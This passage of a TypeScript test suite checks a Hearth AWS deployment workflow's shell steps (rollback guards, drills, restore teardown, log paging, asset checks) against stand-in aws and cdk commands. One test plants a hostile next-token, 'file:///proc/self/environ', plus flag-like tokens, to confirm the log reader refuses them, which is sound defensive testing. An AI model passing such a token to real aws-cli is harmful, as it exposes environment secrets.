    expect(rollback(['A', 'B']).verdict).toBe('pass')
    // ECR's answer that isn't a list of tags can't be read, an empty one is a first deploy's alone, and
    // nothing moves.
    for (const raw of ['null', '"sha"', '{}']) {
      expect(rollback({ raw }).said, raw).toBe("aws-check: ECR's image tags can't be read")
      expect(auto({ raw }).verdict, raw).toBe('refused')
    }
    expect(rollback({ raw: '[]' }).said).toBe('aws-check: ECR holds no image, which only a first deploy may find')
    expect(auto({ raw: '[]' }).verdict).toBe('refused')
  }, 30_000)

  // Round 2's ROLLBACK-01 and AWS-01: an older commit's deploy job (a re-run of an older run, or one GitHub's
  // queue for the group starts after a later one) must not push, move the stacks back or migrate over a later
  // commit's run that pushed, moved them and failed with Release unchanged; a drill neither.
  it('refuses a deploy or a drill once a later commit than the run’s has pushed an image', () => {
    const deploy = (pushed: Answers['pushed'], first = false) =>
      awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), first, pushed })
    for (const later of ['L', 'X'] as const) {
      expect(deploy(['A', 'B', later]).said, later).toBe(
        `aws-check: a later commit (${c[later]}) pushed an image, so it may have moved the stacks or migrated the database: dispatch again from main's head (deploy-and-rollback.md)`,
      )
      expect(
        awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), ecr: all(), pushed: ['B', later] }).said,
        later,
      ).toBe(
        `aws-check: a later commit (${c[later]}) pushed an image, so it may have moved the stacks or migrated the database: dispatch again from main's head (deploy-and-rollback.md)`,
      )
    }
    // Images of this run's commit (an earlier attempt's) and older ones pass.
    expect(deploy(['A', 'B', 'C']).verdict).toBe('pass')
    expect(deploy(['C']).verdict).toBe('pass')
    // ECR with no image is a first deploy's alone.
    const none = { stack: 'none', services: 'nocluster', running: D.B }
    expect(
      awsCheck({ mode: 'deploy', release: release('C', D.C), first: true, ...none, pushed: { raw: '[]' } }).verdict,
    ).toBe('pass')
    expect(deploy({ raw: '[]' }).said).toBe('aws-check: ECR holds no image, which only a first deploy may find')
    expect(deploy({ raw: '[]' }, true).said).toBe('aws-check: ECR holds no image, which only a first deploy may find')
    // A restore deploys only the restore stage's own stacks, so a later image doesn't stop it.
    expect(
      awsCheck({
        mode: 'restore',
        stage: 'restore',
        restore: 'down',
        release: release('B', D.B),
        ...runsB(),
        services: 'nocluster',
        ecr: all(),
        pushed: ['L'],
      }).verdict,
    ).toBe('pass')
  }, 30_000)

  it('reads prod’s Release for a restore, never the restore stage’s own stacks', () => {
    const restore = { mode: 'restore' as const, stage: 'restore', services: 'nocluster', running: D.B, ecr: all() }
    const elsewhere = stack('UPDATE_COMPLETE', release('C', D.C))
    for (const up of [undefined, 'up']) {
      expect(awsCheck({ ...restore, restore: up, release: release('B', D.B), stack: elsewhere }).said).toBe(
        'aws-check: what runs is not the release the gate read',
      )
    }
    expect(awsCheck({ ...restore, release: release('B', D.B), stack: 'none' }).verdict).toBe('refused')
    // ROLLBACK-07: down takes only the restore stage's own stacks down, so it compares no release of
    // prod's, but still waits while prod's Services stack moves.
    expect(awsCheck({ ...restore, restore: 'down', release: release('B', D.B), stack: elsewhere }).verdict).toBe('pass')
    expect(
      awsCheck({
        ...restore,
        restore: 'down',
        release: release('B', D.B),
        stack: stack('UPDATE_IN_PROGRESS', release('C', D.C)),
      }).said,
    ).toBe('aws-check: a deployment is in progress: wait for it to settle, then dispatch again')
  })

  it('refuses a recorded digest ECR doesn’t hold under its own commit’s tag', () => {
    const wrongTag = tags([[D.A, 'B']])
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), ecr: wrongTag }).said).toBe(
      "aws-check: ECR holds no image of the release under its commit's tag",
    )
    expect(awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), ecr: '{}' }).verdict).toBe('refused')
    const live = { stack: stack('UPDATE_COMPLETE', release('C', D.C)), services: ONE, running: D.C }
    expect(
      awsCheck({ mode: 'auto', release: release('C', D.C), previous: release('B', D.D), ...live, ecr: all() }).said,
    ).toBe("aws-check: ECR holds no image of the previous release under its commit's tag")
  })
})

// drill-break (C11-D59, DPW-06), run with bash as non-prod's job runs it: aws is a stand-in function and the
// CLI a stand-in file. The stack's status after the broken deploy proves that deploy reached CloudFormation
// only if this deploy moved it there, since CloudFormation changes a stack's status only when it runs a change
// set: so the drill refuses to start on a stack an earlier rollback left (the eighth review's ROLLBACK-01: a
// CLI that failed before any change set, over a Services stack left UPDATE_ROLLBACK_COMPLETE, passed as a
// drill and was read as proof that the circuit breaker and CloudFormation's rollback work).
// The one-off's end reads its task's log page by page, since GetLogEvents can answer a page partly full or even
// empty while more follow, and ends where the forward token comes back as sent (its API reference). A stand-in
// aws answers each page by the token it is handed; the step's summary is what the person on call reads.
describe('DPW-06 (T24 item 15): the one-off’s log read against planted pages', () => {
  const STUB = `aws() {
  case "$1 $2" in
    'ecs wait') return 0 ;;
    'ecs describe-tasks') printf '{"exit": %s, "stop": "EssentialContainerExited"}\\n' "$EXIT" ;;
    'logs get-log-events')
      local token='' page
      while [ $# -gt 0 ]; do
        if [ "$1" = --next-token ]; then token=$2; fi
        shift
      done
      page=$(jq -c --arg token "$token" '.[$token] // empty' <<<"$PAGES")
      if [ -z "$page" ]; then echo 'unexpected token' >&2; return 99; fi
      printf '%s\\n' "$page" ;;
    *) echo "unexpected aws $*" >&2; return 99 ;;
  esac
}`
  // The task as ECS names it (the account built from parts, so no id is written here).
  const task = `${['arn', 'aws', 'ecs', 'ap-southeast-1', '0'.repeat(12)].join(':')}:task/hearth-nonprod/${'a'.repeat(32)}`
  type Pages = Record<string, { events: unknown; next: string }>
  function oneOff(pages: Pages, exit = 0) {
    const folder = mkdtempSync(join(tmpdir(), 'hearth-dpw06-log-'))
    try {
      const summary = join(folder, 'summary')
      writeFileSync(summary, '')
      const placed = JSON.stringify({ failures: 0, tasks: [task] })
      const result = spawnSync(
        'bash',
        ['-c', `${STUB}\n${PREAMBLE}\n${ONE_OFF}\none_off_end migrate "$MIGRATE_LINES" "$1"`, '_', placed],
        {
          encoding: 'utf8',
          env: {
            PATH: process.env.PATH ?? '',
            HOME: folder,
            RUNNER_TEMP: folder,
            GITHUB_STEP_SUMMARY: summary,
            STAGE: 'nonprod',
            CLUSTER: 'hearth-nonprod',
            EXIT: String(exit),
            PAGES: JSON.stringify(pages),
          },
        },
      )
      return {
        status: result.status,
        summary: readFileSync(summary, 'utf8').trim().split('\n'),
        printed: `${result.stdout}${result.stderr}`,
      }
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  }
  const UNREAD = "migrate: the log may hold lines the job didn't read"

  it('reads past an empty first page to the stream’s end', () => {
    const pages: Pages = {
      '': { events: [], next: 'f/1/s' },
      'f/1/s': { events: ['migrate: applied 0014_provenance', 'connecting to 10.0.0.1'], next: 'f/2/s' },
      'f/2/s': { events: [], next: 'f/2/s' },
    }
    expect(oneOff(pages, 1)).toMatchObject({
      status: 1,
      summary: [
        'migrate: applied 0014_provenance',
        'migrate: 1 log lines withheld',
        'migrate: failed (exit 1, stop code EssentialContainerExited)',
      ],
    })
    expect(
      oneOff({ '': { events: ['migrate: nothing to apply'], next: 'f/7/s' }, 'f/7/s': { events: [], next: 'f/7/s' } }),
    ).toMatchObject({ status: 0, summary: ['migrate: nothing to apply', 'migrate: 0 log lines withheld'] })
  })

  it('stops at five pages, at a token of another shape and at an answer of another shape, saying so', () => {
    const endless: Pages = { '': { events: ['line'], next: 'f/1/s' } }
    for (let n = 1; n < 9; n++) endless[`f/${n}/s`] = { events: ['line'], next: `f/${n + 1}/s` }
    expect(oneOff(endless)).toMatchObject({ status: 0, summary: ['migrate: 5 log lines withheld', UNREAD] })
    // A token aws-cli would load a file by never reaches it.
    const scheme: Pages = {
      '': { events: ['migrate: nothing to apply'], next: 'file:///proc/self/environ' },
      'file:///proc/self/environ': { events: ['migrate: applied 9999_planted'], next: 'f/1/s' },
    }
    expect(oneOff(scheme)).toMatchObject({
      status: 0,
      summary: ['migrate: nothing to apply', 'migrate: 0 log lines withheld', UNREAD],
    })
    for (const next of ['-x', 'a b', '']) {
      const pages: Pages = { '': { events: [], next } }
      if (next !== '') pages[next] = { events: ['migrate: applied 9999_planted'], next }
      expect(oneOff(pages), next).toMatchObject({ status: 0, summary: ['migrate: 0 log lines withheld', UNREAD] })
    }
    // An answer of another shape ends the read, never the job, and no jq error shows its text.
    const odd = oneOff({ '': { events: 'VALUE-1234567', next: 'f/1/s' } })
    expect(odd).toMatchObject({ status: 0, summary: ['migrate: 0 log lines withheld', UNREAD] })
    expect(odd.printed).not.toContain('VALUE')
  })
})

describe('DPW-06 (C11-D59): drill-break against planted AWS answers', () => {
  let scratch = ''
  beforeAll(() => {
    scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw06-drill-'))
    const bin = join(scratch, 'aws-cdk', 'package', 'bin')
    execFileSync('mkdir', ['-p', bin])
    // The stand-in CLI logs its call, moves the stack to CDK_MOVES when given one (CloudFormation ran the
    // change set and rolled it back), and exits CDK_EXIT.
    writeFileSync(
      join(bin, 'cdk'),
      '#!/bin/bash\necho "$1 $4" >>"$CDK_LOG"\nif [ -n "$CDK_MOVES" ]; then printf \'%s\' "$CDK_MOVES" >"$STACK_FILE"; fi\nexit "$CDK_EXIT"\n',
      { mode: 0o755 },
    )
  })
  afterAll(() => {
    if (scratch !== '') rmSync(scratch, { recursive: true, force: true })
  })
  const runOf = () => {
    const nonprod = workflowJobs(deployText).find(each => each.id === 'nonprod')
    const run = (nonprod === undefined ? [] : parsedSteps(nonprod)).find(step => step.name === 'drill-break')?.run
    if (run === undefined) throw new Error('no step drill-break in nonprod')
    return run
  }
  // The stand-in aws: the Services stack's status is STACK_FILE's text, and realtime runs revision 7, one
  // deployment, PRIMARY and COMPLETED, before and after.
  const STUB = `aws() {
  case "$1 $2" in
    'cloudformation describe-stacks') cat "$STACK_FILE"; echo ;;
    'ecs describe-services')
      if [[ "$*" == *'--output text'* ]]; then echo 'task-definition/hearth-nonprod-realtime:7'
      else echo '[{"status":"PRIMARY","rollout":"COMPLETED","definition":"task-definition/hearth-nonprod-realtime:7"}]'; fi ;;
    *) echo "unexpected aws $*" >&2; return 99 ;;
  esac
}`
  function drill(before: string, cdkExit: number, moves = '') {
    const log = join(scratch, 'cdk.log')
    const summary = join(scratch, 'summary')
    const stackFile = join(scratch, 'stack')
    writeFileSync(log, '')
    writeFileSync(summary, '')
    writeFileSync(stackFile, before)
    const result = spawnSync('bash', ['-c', `${STUB}\n${runOf()}`], {
      encoding: 'utf8',
      env: {
        PATH: process.env.PATH ?? '',
        HOME: scratch,
        TMPDIR: scratch,
        GITHUB_OUTPUT: join(scratch, 'output'),
        GITHUB_STEP_SUMMARY: summary,
        RUNNER_TEMP: scratch,
        CDK_LOG: log,
        STACK_FILE: stackFile,
        CDK_EXIT: String(cdkExit),
        CDK_MOVES: moves,
        STAGE: 'nonprod',
      },
    })
    return {
      status: result.status,
      said: result.stdout.trim().split('\n').at(-1) ?? '',
      deployed: readFileSync(log, 'utf8').trim().split('\n').filter(Boolean),
      summary: readFileSync(summary, 'utf8').trim(),
    }
  }
  const unsettled = (status: string) =>
    `drill-break: the Services stack is ${status} before the drill, so its status after couldn't show this deploy reached CloudFormation: dispatch deploy to nonprod first (deploy-and-rollback.md)`

  it('passes when its broken deploy fails and CloudFormation rolls the stack back from a settled update or create', () => {
    for (const before of ['UPDATE_COMPLETE', 'CREATE_COMPLETE']) {
      const passed = drill(before, 1, 'UPDATE_ROLLBACK_COMPLETE')
      expect(passed.status, before).toBe(0)
      expect(passed.deployed, before).toEqual(['deploy nonprod/Services'])
      expect(passed.summary, before).toBe(
        'drill-break: the broken deploy failed and realtime runs hearth-nonprod-realtime:7 again',
      )
    }
  })

  it('refuses to start on a stack an earlier rollback left, which would pass whether or not this deploy reached CloudFormation (ROLLBACK-01)', () => {
    // The CLI fails at once (an asset publish, a throttle, a change set CloudFormation refuses) and moves
    // nothing: over a stack the last drill or a rolled-back forward deploy left, the old step passed.
    for (const before of ['UPDATE_ROLLBACK_COMPLETE', 'ROLLBACK_COMPLETE', 'UPDATE_IN_PROGRESS']) {
      const refused = drill(before, 1)
      expect(refused.status, before).toBe(1)
      expect(refused.said, before).toBe(unsettled(before))
      expect(refused.deployed, before).toEqual([])
      expect(refused.summary, before).toBe('')
    }
  })

  it('fails a broken deploy that never reached CloudFormation, and one that succeeded', () => {
    const early = drill('UPDATE_COMPLETE', 1)
    expect(early.status).toBe(1)
    expect(early.said).toBe('drill-break: the Services stack is UPDATE_COMPLETE, not UPDATE_ROLLBACK_COMPLETE')
    expect(early.deployed).toEqual(['deploy nonprod/Services'])
    const succeeded = drill('UPDATE_COMPLETE', 0, 'UPDATE_COMPLETE')
    expect(succeeded.status).toBe(1)
    expect(succeeded.said).toBe('drill-break: the broken Services deploy succeeded, so the drill proved nothing')
    expect(succeeded.summary).toBe('')
  })
})

// restore=down (C11-D45; T24 item 18) and the prod job's read-back after it, each step's run taken from
// deploy.yml and run with bash and jq against a stand-in aws and CLI (ROLLBACK-04): down skips a restore
// stack a failed create left (ROLLBACK_COMPLETE or REVIEW_IN_PROGRESS) and refuses one still moving, and
// the read-back reads a Services stack so left as the release it was given, never as a refusal.
describe('DPW-06 (C11-D45): restore=down and its read-back against planted AWS answers', () => {
  let scratch = ''
  beforeAll(() => {
    scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw06-down-'))
    const bin = join(scratch, 'aws-cdk', 'package', 'bin')
    execFileSync('mkdir', ['-p', bin])
    writeFileSync(join(bin, 'cdk'), '#!/bin/bash\necho "$1 $4" >>"$CDK_LOG"\n', { mode: 0o755 })
  })
  afterAll(() => {
    if (scratch !== '') rmSync(scratch, { recursive: true, force: true })
  })
  const runOf = (name: string) => {
    const prod = workflowJobs(deployText).find(each => each.id === 'prod')
    const run = (prod === undefined ? [] : parsedSteps(prod)).find(step => step.name === name)?.run
    if (run === undefined) throw new Error(`no step ${name} in prod`)
    return run
  }
  const RELEASE = `${'c'.repeat(40)}:sha256:${'0'.repeat(64)}`
  // The stand-in aws: STATUS_<Part> is each restore stack's status (none: it doesn't exist), SERVICES_STACK
  // the Services stack's status and Release as the read-back asks, and the restore cluster is gone.
  const STUB = `aws() {
  case "$1 $2" in
    'cloudformation describe-stacks')
      local part=\${4##*-} value
      if [[ "$6" == *StackStatus,* ]]; then value=$SERVICES_STACK; else value=$(eval "printf '%s' \\"\\\${STATUS_$part}\\"") ; fi
      if [ "$value" = none ]; then
        echo "An error occurred (ValidationError) when calling the DescribeStacks operation: Stack with id $4 does not exist" >&2
        return 254
      fi
      printf '%s\\n' "$value" ;;
    'ecs describe-services')
      echo 'An error occurred (ClusterNotFoundException) when calling the DescribeServices operation: Cluster not found.' >&2
      return 254 ;;
    *) echo "unexpected aws $*" >&2; return 99 ;;
  esac
}`
  function step(name: string, env: Record<string, string>) {
    const output = join(scratch, 'output')
    const log = join(scratch, 'cdk.log')
    writeFileSync(output, '')
    writeFileSync(log, '')
    const result = spawnSync('bash', ['-c', `${STUB}\n${runOf(name)}`], {
      encoding: 'utf8',
      env: {
        PATH: process.env.PATH ?? '',
        HOME: scratch,
        TMPDIR: scratch,
        GITHUB_WORKSPACE: join(scratch, 'workspace'),
        GITHUB_OUTPUT: output,
        GITHUB_STEP_SUMMARY: join(scratch, 'summary'),
        RUNNER_TEMP: scratch,
        CDK_LOG: log,
        STAGE: 'restore',
        RELEASE,
        MODE: 'deploy',
        RESTORE: 'down',
        STATUS_Services: 'UPDATE_COMPLETE',
        STATUS_Data: 'UPDATE_COMPLETE',
        STATUS_Platform: 'UPDATE_COMPLETE',
        SERVICES_STACK: JSON.stringify(['UPDATE_COMPLETE', RELEASE]),
        ...env,
      },
    })
    return {
      status: result.status,
      said: result.stdout.trim().split('\n').at(-1) ?? '',
      deployed: readFileSync(log, 'utf8').trim().split('\n').filter(Boolean),
      output: readFileSync(output, 'utf8'),
    }
  }
  // What prod-plan's diff read of each restore stack, as RESTORE_DOWN_DIFF writes its down output (missing, or
  // the stack's status), for the statuses a case plants: down's PLANNED unless the case names its own.
  const planned = (env: Record<string, string>) => {
    const statuses: Record<string, string> = {
      STATUS_Services: 'UPDATE_COMPLETE',
      STATUS_Data: 'UPDATE_COMPLETE',
      STATUS_Platform: 'UPDATE_COMPLETE',
      ...env,
    }
    return ['Services', 'Data', 'Platform']
      .map(part => `${part}:${statuses[`STATUS_${part}`] === 'none' ? 'missing' : statuses[`STATUS_${part}`]},`)
      .join('')
  }
  const down = (env: Record<string, string>) => step('Take the restore stage down', { PLANNED: planned(env), ...env })
  const readBack = (env: Record<string, string>) => step('Read back what runs', env)

  it('takes each settled stack down in order, and skips one a failed create left or that doesn’t exist', () => {
    expect(down({}).deployed).toEqual(['deploy restore/Services', 'deploy restore/Data', 'deploy restore/Platform'])
    for (const left of ['ROLLBACK_COMPLETE', 'REVIEW_IN_PROGRESS', 'none']) {
      const after = down({ STATUS_Services: left })
      expect(after.status, left).toBe(0)
      expect(after.deployed, left).toEqual(['deploy restore/Data', 'deploy restore/Platform'])
    }
    expect(down({ STATUS_Data: 'REVIEW_IN_PROGRESS', STATUS_Platform: 'ROLLBACK_COMPLETE' }).deployed).toEqual([
      'deploy restore/Services',
    ])
    // Round 2's ROLLBACK-03 and AWS-02: a stack whose failed create couldn't roll back (which the CLI would
    // delete and create again, and whose delete termination protection refuses) is skipped, the others are
    // still taken down, and the step then fails, naming each such stack.
    const kept = down({ STATUS_Data: 'ROLLBACK_FAILED' })
    expect(kept.status).toBe(1)
    expect(kept.deployed).toEqual(['deploy restore/Services', 'deploy restore/Platform'])
    expect(kept.said).toBe(
      "restore down: the restore stage isn't down: tier 2 deletes Hearth-restore-Data (deploy-and-rollback.md)",
    )
    const both = down({ STATUS_Services: 'ROLLBACK_FAILED', STATUS_Platform: 'ROLLBACK_FAILED' })
    expect(both.status).toBe(1)
    expect(both.deployed).toEqual(['deploy restore/Data'])
    expect(both.said).toBe(
      "restore down: the restore stage isn't down: tier 2 deletes Hearth-restore-Services Hearth-restore-Platform (deploy-and-rollback.md)",
    )
    const moving = down({ STATUS_Data: 'UPDATE_IN_PROGRESS' })
    expect(moving.status).toBe(1)
    expect(moving.said).toBe(
      'restore down: Hearth-restore-Data is UPDATE_IN_PROGRESS: wait for it to settle, then dispatch again',
    )
    expect(moving.deployed).toEqual(['deploy restore/Services'])
  })

  // INPUTS-A1-01 (the eighth review's first attack): prod-plan decided which restore stacks down diffs, and
  // down decided again, after the approval, which it deploys, so a stack that didn't exist (or that a failed
  // create left) when prod-plan read it, and that another restore's up created (or recreated) before down
  // ran, was deployed from a template no diff showed. down now reads every stack first and refuses, before
  // any deploy, unless it reads what prod-plan read.
  it('takes nothing down unless every restore stack reads as prod-plan read it (INPUTS-A1-01)', () => {
    const changed =
      'restore down: the restore stage changed since prod-plan diffed it (prod-plan read Services:missing,Data:missing,Platform:missing,, down reads Services:CREATE_COMPLETE,Data:CREATE_COMPLETE,Platform:CREATE_COMPLETE,), so nothing is taken down: dispatch restore=down again'
    // An up and a down dispatched together: the down's plan read no stack, the up then made all three.
    const raced = down({
      STATUS_Services: 'CREATE_COMPLETE',
      STATUS_Data: 'CREATE_COMPLETE',
      STATUS_Platform: 'CREATE_COMPLETE',
      PLANNED: 'Services:missing,Data:missing,Platform:missing,',
    })
    expect(raced).toMatchObject({ status: 1, said: changed, deployed: [] })
    // A failed up and its retry: the plan read Services as its failed create left it, the retry made it again.
    const retried = down({
      STATUS_Services: 'CREATE_COMPLETE',
      PLANNED: planned({ STATUS_Services: 'ROLLBACK_COMPLETE' }),
    })
    expect(retried.status).toBe(1)
    expect(retried.deployed).toEqual([])
    expect(retried.said).toContain('the restore stage changed since prod-plan diffed it')
    // Any other change, a stack gone since, and no read from prod-plan at all refuse too.
    const changes: ReadonlyArray<Record<string, string>> = [
      { STATUS_Data: 'UPDATE_ROLLBACK_COMPLETE' },
      { STATUS_Platform: 'none', PLANNED: planned({}) },
      { PLANNED: '' },
      { PLANNED: planned({}).replace('Platform:UPDATE_COMPLETE,', '') },
    ]
    for (const env of changes) {
      const refused = down({ PLANNED: planned({}), ...env })
      expect(refused.status, JSON.stringify(env)).toBe(1)
      expect(refused.deployed, JSON.stringify(env)).toEqual([])
    }
    // The stage as prod-plan read it is taken down as before, a stack it read as missing skipped.
    expect(down({ STATUS_Services: 'none' })).toMatchObject({
      status: 0,
      deployed: ['deploy restore/Data', 'deploy restore/Platform'],
    })
  })

  it('reads a restore Services stack a failed create left as the release down was given, and nothing else', () => {
    for (const left of [
      JSON.stringify(['ROLLBACK_COMPLETE', null]),
      JSON.stringify(['REVIEW_IN_PROGRESS', null]),
      'none',
    ]) {
      const after = readBack({ SERVICES_STACK: left })
      expect(after.status, left).toBe(0)
      expect(after.output, left).toContain(`deployed=${RELEASE}\n`)
      expect(after.output, left).toContain('services={}\n')
    }
    const other = `${'d'.repeat(40)}:sha256:${'1'.repeat(64)}`
    expect(readBack({ SERVICES_STACK: JSON.stringify(['UPDATE_COMPLETE', other]) }).output).toContain(
      `deployed=${other}\n`,
    )
    // A stack with no Release is a refusal anywhere but restore=down, and a malformed one is a refusal always.
    const refused = "read-back: Hearth-restore-Services' Release isn't <commit>:<digest>"
    expect(readBack({ RESTORE: 'up', SERVICES_STACK: JSON.stringify(['ROLLBACK_COMPLETE', null]) })).toMatchObject({
      status: 1,
      said: refused,
    })
    expect(readBack({ SERVICES_STACK: JSON.stringify(['UPDATE_COMPLETE', null]) })).toMatchObject({
      status: 1,
      said: refused,
    })
    expect(readBack({ SERVICES_STACK: JSON.stringify(['ROLLBACK_COMPLETE', 'None']) })).toMatchObject({
      status: 1,
      said: refused,
    })
  })
})

// ASSET_CHECK itself (DPW-14), run with bash and jq on copies of the workload's own assembly,
// synthesised in process by infra's helper with the CLI's path and asset metadata, as cdk synth writes it
// (CI's check runs the tests before synth:ci, and cdk.out isn't committed): the real layout passes, and each
// planted breakage is refused with one line naming its rule.
describe('DPW-14 (C11-D76): ASSET_CHECK on planted assemblies', () => {
  const RELEASE = `${'f'.repeat(40)}:sha256:${'0'.repeat(64)}`
  let source = ''
  const made: string[] = []
  beforeAll(() => {
    source = synthWorkload({ cliMetadata: true }).synthesised.outdir
  }, 120_000)
  afterAll(() => {
    for (const folder of made) rmSync(folder, { recursive: true, force: true })
  })
  const read = (path: string) => JSON.parse(readFileSync(path, 'utf8')) as Record<string, unknown>
  const write = (path: string, value: unknown) => writeFileSync(path, JSON.stringify(value))
  const edit = (path: string, change: (json: Record<string, unknown>) => void) => {
    const json = read(path)
    change(json)
    write(path, json)
  }
  const named = (dir: string, part: string, suffix: string) => {
    const name = readdirSync(dir).find(each => each.includes(part) && each.endsWith(suffix))
    if (name === undefined) throw new Error(`no ${part}${suffix} in the assembly`)
    return join(dir, name)
  }
  type Artifact = {
    type?: string
    properties?: Record<string, unknown>
    metadata?: unknown
    additionalMetadataFile?: string
  }
  const artifacts = (json: Record<string, unknown>) => (json.artifacts ?? {}) as Record<string, Artifact>
  const files = (json: Record<string, unknown>) =>
    Object.values((json.files ?? {}) as Record<string, { source: Record<string, unknown> }>)
  // Sets one field of every file asset's source in an asset manifest.
  const setSources = (json: Record<string, unknown>, change: (source: Record<string, unknown>) => void) => {
    for (const file of files(json)) change(file.source)
  }
  const ENTRY = {
    type: 'aws:cdk:asset',
    data: { packaging: 'container-image', path: 'asset.x', id: 'x', sourceHash: 'x' },
  }

  function check(
    plant: (dir: string) => void,
    release = RELEASE,
    from = source,
    path = process.env.PATH,
    text = ASSET_CHECK,
  ): string {
    const dir = mkdtempSync(join(tmpdir(), 'hearth-dpw14-'))
    made.push(dir)
    cpSync(from, dir, { recursive: true })
    plant(dir)
    const result = spawnSync(
      'bash',
      ['-c', `set -euo pipefail\n${text}\ncheck_assembly "$1"\ncheck_release_in "$1" "$2"`, '_', dir, release],
      { encoding: 'utf8', env: { ...process.env, PATH: path } },
    )
    const said = `${result.stdout}${result.stderr}`.trim()
    return result.status === 0 ? `passed${said === '' ? '' : `: ${said}`}` : said
  }
  // Round 13: the nine steps that check an assembly run one text, ASSET_CHECK_RUN, whose calls read the folder from
  // the step's ASSEMBLY_FOLDER and the release from its RELEASE. Run as a step runs it (bash -e -o pipefail, its
  // env: set, the runner's folder in RUNNER_TEMP), it says what the literal calls said, the rollbacks' reading
  // PREVIOUS: it passes the right folder and release, and refuses a folder that isn't there and another release;
  // and with no ASSEMBLY_FOLDER or RELEASE, set -u stops it.
  function step(run: string, env: Readonly<Record<string, string>>, temp: string) {
    const base = { ...process.env }
    for (const name of ['ASSEMBLY_FOLDER', 'RELEASE', 'PREVIOUS']) delete base[name]
    const result = spawnSync('bash', ['--noprofile', '--norc', '-eo', 'pipefail', '-c', run], {
      encoding: 'utf8',
      env: { ...base, RUNNER_TEMP: temp, ...env },
    })
    return { status: result.status, said: [...spoken(result.stdout), ...result.stderr.trim().split('\n')] }
  }
  it('runs ASSET_CHECK_RUN as a step, reading its folder and release from its env: as the literal calls did (round 13)', () => {
    const temp = mkdtempSync(join(tmpdir(), 'hearth-dpw14-step-'))
    made.push(temp)
    cpSync(source, join(temp, 'assembly'), { recursive: true })
    const literal = (folder: string, variable: string) =>
      [
        STOP_HEAD,
        ASSET_CHECK,
        `check_assembly "$RUNNER_TEMP/${folder}"`,
        `check_release_in "$RUNNER_TEMP/${folder}" "$${variable}"`,
      ].join('\n')
    const other = `${'e'.repeat(40)}:sha256:${'0'.repeat(64)}`
    const right = step(ASSET_CHECK_RUN, { ASSEMBLY_FOLDER: 'assembly', RELEASE }, temp)
    expect(right.status).toBe(0)
    expect(right).toEqual(step(literal('assembly', 'RELEASE'), { RELEASE }, temp))
    const missing = step(ASSET_CHECK_RUN, { ASSEMBLY_FOLDER: 'assembly-previous', RELEASE }, temp)
    expect(missing.status).not.toBe(0)
    expect(missing).toEqual(step(literal('assembly-previous', 'PREVIOUS'), { PREVIOUS: RELEASE }, temp))
    const released = step(ASSET_CHECK_RUN, { ASSEMBLY_FOLDER: 'assembly', RELEASE: other }, temp)
    expect(released.status).not.toBe(0)
    expect(released).toEqual(step(literal('assembly', 'RELEASE'), { RELEASE: other }, temp))
    expect(step(ASSET_CHECK_RUN, { RELEASE }, temp).said.join('\n')).toMatch(/ASSEMBLY_FOLDER: unbound variable/)
    expect(step(ASSET_CHECK_RUN, { ASSEMBLY_FOLDER: 'assembly' }, temp).said.join('\n')).toMatch(
      /RELEASE: unbound variable/,
    )
  }, 240_000)

  // ASSET_CHECK over a build, with a jq first on PATH that runs the real one with -c added and notes every
  // call handed -e whose program printed other than one value, since jq -e reads the last value alone: the
  // check's outcome, then each such call. DPW-10 (jqPrintsOne) holds the texts' programs; this holds the
  // committed rules over the real builds, as jq reads them. A call is handed -e by any flag word before its
  // program (round 12's second iteration: it read the first word alone, so jq -r -e was never counted).
  function counted(from = source, text = ASSET_CHECK): string {
    const bin = mkdtempSync(join(tmpdir(), 'hearth-dpw14-jq-'))
    made.push(bin)
    const real = execFileSync('bash', ['-c', 'command -v jq'], { encoding: 'utf8' }).trim()
    const many = join(bin, 'many')
    writeFileSync(many, '')
    writeFileSync(
      join(bin, 'jq'),
      [
        '#!/usr/bin/env bash',
        'status=no skip=0',
        'for word in "$@"; do',
        '  if [ "$skip" -gt 0 ]; then skip=$((skip - 1)); continue; fi',
        '  case "$word" in --arg | --argjson) skip=2 ;; --*) ;; -*e*) status=yes ;; -*) ;; *) break ;; esac',
        'done',
        `if [ "$status" = no ]; then exec '${real}' "$@"; fi`,
        `out=$('${real}' -c "$@")`,
        'status=$?',
        `if [ "$status" -le 1 ] && [ "$(printf '%s' "$out" | grep -c '')" != 1 ]; then printf '%.200s\\n' "$*" >>'${many}'; fi`,
        `printf '%s\\n' "$out"`,
        'exit "$status"',
        '',
      ].join('\n'),
      { mode: 0o755 },
    )
    const said = check(() => {}, RELEASE, from, `${bin}:${process.env.PATH ?? ''}`, text)
    return [
      said,
      ...readFileSync(many, 'utf8')
        .split('\n')
        .filter(line => line !== ''),
    ].join('\n')
  }
  const refused = (rule: string) => `asset-check: ${rule}`
  const RUNS = refused('a file asset runs a command, is packaged otherwise than file or zip, or names no relative path')
  const PLAIN = refused('a manifest names a file that is not a plain name in its own folder')
  const LEGACY = refused(
    'an artifact carries a metadata entry of a type a workload synth never writes: a legacy asset, which the CLI would build or upload, stack tags, which an older CLI applies to every resource of its stack, or another',
  )
  const TEMPLATE = refused(
    "a stack's name isn't Hearth- and its stage's id, or the template CloudFormation is handed isn't its own templateFile",
  )
  const DESTINATION = refused(
    "a file asset's one destination isn't the staging bucket, its region and its publishing role as the synth spells them, at a key of 64 hex digits that ends as its packaging does, or a file asset isn't a plain name in its own folder",
  )
  const KEY = refused("a file asset's key isn't the sha256 of its bytes")
  const ID = refused(
    "a file asset's id isn't its key's 64 hex digits (the CLI packages a zip at, and uploads one it finds at, .cache/<id>.zip)",
  )
  const FACTS = refused(
    "a stack's or an asset manifest's deploy facts aren't the workload synth's: its environment, roles and bootstrap version, termination protection on Platform and Data alone, and no topic, tag, parameter or other property",
  )
  const nonprod = (dir: string) => join(dir, 'assembly-nonprod')
  const prod = (dir: string) => join(dir, 'assembly-prod')
  type Entry = { source: Record<string, unknown>; destinations: Record<string, Record<string, unknown>> }
  const entries = (json: Record<string, unknown>) => Object.values((json.files ?? {}) as Record<string, Entry>)
  const keyOf = (path: string) => `${createHash('sha256').update(readFileSync(path)).digest('hex')}.json`
  const BUCKET = `cdk-hearthapp-assets-\${AWS::AccountId}-ap-southeast-1`
  // Re-keys a stack's template asset after a plant edits its template, as the synth would (the key is the
  // sha256 of the template's bytes, and the asset's id the key's digits), so the check reaches the rule the
  // plant is for.
  const rekey = (folder: string, part: string) => {
